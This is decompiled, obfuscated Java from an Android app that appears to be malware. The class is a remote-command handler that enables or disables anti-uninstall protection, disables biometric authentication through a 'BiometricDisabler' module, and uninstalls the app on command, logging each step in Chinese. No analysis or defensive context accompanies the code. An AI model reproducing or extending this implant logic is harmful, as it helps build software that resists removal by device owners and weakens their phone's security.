package p000;

import android.os.Handler;
import android.os.Looper;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0317a2;
import com.storm.safe.rock.service.modules.protection.C0355a0;
import java.util.Set;
import org.json.JSONObject;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class cp0 implements InterfaceC0726jp {
    static {
        new bp0(null);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a0 */
    public final boolean mo210872a0(String str) {
        return t60.m214690a8(this, str);
    }

    @Override // p000.InterfaceC0726jp
    /* renamed from: a1 */
    public final Set mo210873a1() {
        return kg1.m213542f1("ENABLE_UNINSTALL_PROTECTION", "DISABLE_UNINSTALL_PROTECTION", "DISABLE_BIOMETRIC", "UNINSTALL_SELF");
    }

    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue */
    @Override // p000.InterfaceC0726jp
    /* renamed from: a2 */
    public final Object mo210874a2(String str, JSONObject jSONObject, uz0 uz0Var, InterfaceC0876mv interfaceC0876mv) {
        switch (str.hashCode()) {
            case -1545244787:
                if (str.equals("DISABLE_UNINSTALL_PROTECTION")) {
                    t60.m214714d6("ProtectionCmdHandler", "收到禁用防卸载保护命令");
                    dqtvuisjd dqtvuisjdVar = uz0Var.f60536a0;
                    if (dqtvuisjdVar.f52435g6 == null) {
                        t60.m214726f4("dqtvuisjd", "⚠️ kinztpexl 未初始化");
                        break;
                    } else {
                        dqtvuisjdVar.f52477k8 = !r5.m211938c2();
                        break;
                    }
                }
                break;
            case -1346211671:
                if (str.equals("UNINSTALL_SELF")) {
                    t60.m214714d6("ProtectionCmdHandler", "收到卸载自身命令");
                    dqtvuisjd dqtvuisjdVar2 = uz0Var.f60536a0;
                    try {
                        t60.m214714d6("dqtvuisjd", "🗑️ 开始一键卸载流程");
                        t60.m214714d6("dqtvuisjd", "📦 应用包名: " + dqtvuisjdVar2.getPackageName());
                        t60.m214714d6("dqtvuisjd", "🛡️ Step 1: 关闭防卸载保护");
                        if (dqtvuisjdVar2.f52477k8) {
                            dqtvuisjdVar2.f52477k8 = false;
                            C0355a0 c0355a0 = dqtvuisjdVar2.f52435g6;
                            if (c0355a0 != null) {
                                c0355a0.m211938c2();
                            }
                            t60.m214714d6("dqtvuisjd", "✅ 防卸载保护已关闭");
                        }
                        t60.m214714d6("dqtvuisjd", "📱 Step 2: 唤醒屏幕");
                        dqtvuisjdVar2.m211536n5();
                        new Handler(Looper.getMainLooper()).postDelayed(new bm0(dqtvuisjdVar2, 5), 500L);
                        break;
                    } catch (Exception e) {
                        t60.m214705c6("dqtvuisjd", "❌ 一键卸载失败", e);
                        break;
                    }
                }
                break;
            case -1109616718:
                if (str.equals("ENABLE_UNINSTALL_PROTECTION")) {
                    t60.m214714d6("ProtectionCmdHandler", "收到启用防卸载保护命令");
                    uz0Var.f60536a0.m211460e9();
                    break;
                }
                break;
            case 2111073249:
                if (str.equals("DISABLE_BIOMETRIC")) {
                    t60.m214714d6("ProtectionCmdHandler", "收到禁用生物识别命令");
                    dqtvuisjd dqtvuisjdVar3 = uz0Var.f60536a0;
                    try {
                        t60.m214714d6("dqtvuisjd", "🔐 开始禁用生物识别...");
                        C0317a2 c0317a2 = dqtvuisjdVar3.f52418e9;
                        if (c0317a2 == null) {
                            t60.m214704c5("dqtvuisjd", "❌ BiometricDisabler未初始化");
                            dqtvuisjdVar3.m211514l1("模块未初始化", false);
                        } else {
                            c0317a2.m211561a7(new uz0(dqtvuisjdVar3));
                        }
                        break;
                    } catch (Exception e2) {
                        t60.m214705c6("dqtvuisjd", "❌ 禁用生物识别异常", e2);
                        dqtvuisjdVar3.m211514l1("执行异常: " + e2.getMessage(), false);
                        break;
                    }
                }
                break;
        }
        return C1351vv.f60710b1;
    }
}
